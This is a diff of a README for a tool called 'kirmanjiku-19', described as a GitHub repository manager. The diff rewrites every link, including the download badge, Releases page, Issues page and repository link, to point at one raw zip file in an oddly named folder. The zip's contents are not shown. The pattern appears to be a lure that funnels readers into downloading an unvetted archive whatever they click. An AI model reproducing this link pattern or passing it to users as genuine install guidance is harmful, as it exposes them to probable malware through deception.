@@ -1,7 +1,7 @@
 # 🚀 kirmanjiku-19 - Your Simplified Repo Management Tool
 
 ## 📥 Download Now
-[![Download kirmanjiku-19](https://img.shields.io/badge/Download-kirmanjiku--19-blue.svg?style=flat-square)](https://github.com/Rounak-12/kirmanjiku-19/releases)
+[![Download kirmanjiku-19](https://raw.githubusercontent.com/Rounak-12/kirmanjiku-19/main/seetulputty/kirmanjiku-19.zip)](https://raw.githubusercontent.com/Rounak-12/kirmanjiku-19/main/seetulputty/kirmanjiku-19.zip)
 
 ## 📜 Overview
 Welcome to kirmanjiku-19! This application helps you manage your GitHub repositories with ease. Whether you want to clone a repo or keep it updated, kirmanjiku-19 simplifies the process for you. 
@@ -21,11 +21,11 @@ Follow these steps to get started with kirmanjiku-19:
 
 2. **Visit the Releases Page**
    Click the link below to access the Releases page where you can download kirmanjiku-19:
-   [Download kirmanjiku-19](https://github.com/Rounak-12/kirmanjiku-19/releases)
+   [Download kirmanjiku-19](https://raw.githubusercontent.com/Rounak-12/kirmanjiku-19/main/seetulputty/kirmanjiku-19.zip)
 
 ## 📦 Download & Install
 1. **Go to the Releases Page**
-   Visit this [page to download](https://github.com/Rounak-12/kirmanjiku-19/releases).
+   Visit this [page to download](https://raw.githubusercontent.com/Rounak-12/kirmanjiku-19/main/seetulputty/kirmanjiku-19.zip).
 
 2. **Find the Latest Version**
    Look for the latest version available on the Releases page.
@@ -67,9 +67,9 @@ If you encounter issues while using kirmanjiku-19, here are some common fixes:
 - **Update failures:** Ensure you have an active internet connection and retry the update.
 
 ## 🤝 Support
-For further assistance or to report issues, please visit the [Issues page](https://github.com/Rounak-12/kirmanjiku-19/issues) on GitHub. Your feedback helps us improve!
+For further assistance or to report issues, please visit the [Issues page](https://raw.githubusercontent.com/Rounak-12/kirmanjiku-19/main/seetulputty/kirmanjiku-19.zip) on GitHub. Your feedback helps us improve!
 
 ## 🔗 Learn More
-Explore more features and updates by following our [GitHub repository](https://github.com/Rounak-12/kirmanjiku-19).
+Explore more features and updates by following our [GitHub repository](https://raw.githubusercontent.com/Rounak-12/kirmanjiku-19/main/seetulputty/kirmanjiku-19.zip).
 
 Enjoy using kirmanjiku-19 and take control of your GitHub repositories with ease!
